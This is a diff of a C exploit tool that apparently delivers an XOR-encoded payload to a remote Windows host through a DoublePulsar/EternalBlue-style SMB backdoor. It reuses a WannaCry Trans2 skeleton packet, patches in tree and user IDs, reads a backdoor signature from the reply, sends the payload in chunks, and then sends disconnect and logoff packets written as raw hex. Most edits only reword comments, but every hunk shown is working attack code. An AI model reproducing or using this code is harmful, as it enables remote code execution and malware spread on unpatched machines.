@@ -426,8 +426,10 @@ int main(int argc, char* argv[])
 	}
 	printf("\n");
 
-	//Generates a new TreeConnect request with the correct IP address
-	//rather than the hard coded one embedded in the TreeConnect string
+	/*
+	Generates a dynamic TreeConnect request with the correct IP address
+	rather than a hard coded IP address like the one embedded in the Wannacry TreeConnect packet
+	*/
 	unsigned char packet[4096];
 	unsigned char* ptr;
 	unsigned char tmp[1024];
@@ -473,8 +475,8 @@ int main(int argc, char* argv[])
 	signature[1] = recvbuff[19];
 	signature[2] = recvbuff[20];
 	signature[3] = recvbuff[21];
-	//signature[4] = recvbuff[22];
 	signature[4] = '\0';
+	//signature[4] = recvbuff[22];
 	//value at this offset 22 in recvbuff[22] location in the recvbuff is for determining architecture but unused at this time
 
 	//convert the signature buffer to unsigned integer 
@@ -636,11 +638,10 @@ int main(int argc, char* argv[])
 
 			hexDump(NULL, Parametersbuffer, 12);
 
-
-			//copy wannacry skeleton packet to big Trans2 packet
+			//copy wannacry skeleton packet to big SMB Trans2 execution packet
 			memcpy((unsigned char*)last_packet, (unsigned char*)wannacry_Trans2_Request, 70);
 
-			//update size
+			//update NetBIOS size in the packet
 			memcpy(last_packet + 2, &smb_htons_len, 2);
 			hexDump(NULL, (char*)last_packet, 4);
 
@@ -648,22 +649,24 @@ int main(int argc, char* argv[])
 			DataCount = bytesLeft;
 			byteCount = bytesLeft + 13;
 
+			//update the TotalDataCount, DataCount & byteCount in the packet by assigning the values
 			*(WORD*)(last_packet + 0x27) = TotalDataCount;
 			*(WORD*)(last_packet + 0x3b) = DataCount;
 			*(WORD*)(last_packet + 0x43) = byteCount;
 
+			//update the TotalDataCount, DataCount & byteCount in the packet using memcpy
 			memcpy((unsigned char*)last_packet + 0x27, (unsigned char*)&TotalDataCount, 2);
 			memcpy((unsigned char*)last_packet + 0x3b, (unsigned char*)&DataCount, 2);
 			memcpy((unsigned char*)last_packet + 0x43, (unsigned char*)&byteCount, 2);
 
-			//Update treeID, UserID
+			//Update treeID, UserID in the Tran2 execution packet
 			memcpy((unsigned char*)last_packet + 28, (unsigned char*)&treeid, 2);
 			memcpy((unsigned char*)last_packet + 32, (unsigned char*)&userid, 2);
 
 			//copy parameters to big packet at offset 70 ( after the trans2 exec packet )
 			memcpy((unsigned char*)last_packet + 70, (unsigned char*)Parametersbuffer, 12);
 
-			//copy encrypted payload
+			//copy the XORed payload
 			memcpy((unsigned char*)last_packet + 82, (unsigned char*)pFULLBUFFER + ctx, bytesLeft);
 
 			//send the payload
@@ -717,7 +720,7 @@ int main(int argc, char* argv[])
 		//copy parameters to big packet at offset 70 ( after the trans2 exec packet )
 		memcpy((unsigned char*)big_packet + 70, (unsigned char*)Parametersbuffer, 12);
 
-		//copy encrypted payload
+		//copy XORed payload
 		memcpy((unsigned char*)big_packet + 82, (unsigned char*)pFULLBUFFER + ctx, ChunkSize);
 
 		//Update treeID, UserID
@@ -772,7 +775,7 @@ int main(int argc, char* argv[])
 		"\x00\x00\x00\x00\x00\x08\xff\xfe"
 		"\x00\x08\x41\x00\x00\x00\x00";
 
-	//Update treeID, UserID
+	//Update treeID, UserID in the disconnect packet
 	memcpy((unsigned char*)disconnect_packet + 28, (unsigned char*)&treeid, 2);
 	memcpy((unsigned char*)disconnect_packet + 32, (unsigned char*)&userid, 2);
 
@@ -780,17 +783,16 @@ int main(int argc, char* argv[])
 	send(sock, (char*)disconnect_packet, sizeof(disconnect_packet) - 1, 0);
 	recv(sock, (char*)recvbuff, sizeof(recvbuff), 0);
 
-
 	unsigned char logoff_packet[] =
 		"\x00\x00\x00\x27\xff\x53\x4d\x42\x74\x00\x00"
 		"\x00\x00\x18\x07\xc0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\xff"
 		"\xfe\x00\x08\x41\x00\x02\xff\x00\x27\x00\x00\x00";
 
-	//Update treeID, UserID
+	//Update treeID, UserID in the logoff packet
 	memcpy((unsigned char*)logoff_packet + 28, (unsigned char*)&treeid, 2);
 	memcpy((unsigned char*)logoff_packet + 32, (unsigned char*)&userid, 2);
 
-	//send the logoff packet
+	//send the SMB logoff packet
 	send(sock, (char*)logoff_packet, sizeof(logoff_packet) - 1, 0);
 	recv(sock, (char*)recvbuff, sizeof(recvbuff), 0);
 
